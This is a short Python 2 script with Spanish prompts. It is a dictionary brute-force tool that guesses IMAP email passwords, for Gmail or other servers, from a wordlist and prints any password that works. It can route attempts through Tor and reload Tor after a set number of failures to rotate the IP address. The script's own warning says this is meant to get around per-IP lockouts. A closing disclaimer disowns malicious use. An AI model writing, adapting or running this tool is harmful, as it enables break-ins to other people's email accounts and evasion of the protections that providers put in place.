import socks
import sys
import subprocess
import ssl
import imaplib
from socks import PROXY_TYPE_HTTP
from socks import PROXY_TYPE_SOCKS5

if __name__ == "__main__":
	print '''Ten presente los siguientes tres puntos: 
		1-Es muy posible que algunos servidores, como gmail, rechace toda conexion desde un proxy o desde tor; 
		2-Es posible que un servidor, como outloot, corte la conexion si haces mas de tres intentos con la misma ip
		3-El autor no se hace responsable del uso malicioso  de esta herramienta'''
	inter=2
	tor=False
	palabras=[]
	email= raw_input('Usuario gmail o correo electronico cuando se usa otro imap server: ')
	diccionario=raw_input('Ruta completa del diccionario: ')
	imap_server=raw_input('IMAP server: ')
	imap_port=raw_input('Puerto imap: ')
	proxy_ip=raw_input('Si quieres probar ip-tor-bypass (funcion experimental que requiere tor), ingresa la ip local: ')
        if proxy_ip is not '' :
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
                socks.wrapmodule(imaplib)
		tor=True
		inter=int(raw_input('Cada cuantos intentos fallidos deseas cambiar tu ip?:'))
	if tor is False:
		proxy_ip=raw_input('Si tienes proxy, ingresa ip del proxy http: ')
		if proxy_ip is not '':
		
			proxy_port=raw_input('Port del proxy http: ')
	        	socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, proxy_ip, int(proxy_port))
        		socks.wrapmodule(imaplib)

	
	archivo = open(diccionario)
	for lineas in archivo.readlines():
    		palabras.append(lineas[:-1])

	server = imaplib.IMAP4_SSL(imap_server, imap_port)
	intentos=0
	for password in palabras:

		try:
			rv, data=server.login(email, password)
			
			print 'LA PASSWORD ES '+password
			sys.exit(0)		
		except imaplib.IMAP4.error as detalle:
			if intentos == inter and tor is True:
				
				p=subprocess.call (["/etc/init.d/tor", "reload"])
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
        	                socks.wrapmodule(imaplib)
				server = imaplib.IMAP4_SSL(imap_server, imap_port)
				intentos=0
			intentos=intentos+1
			print detalle
			print 'ERROR AL LOGUEARSE CON '+password
			
			pass

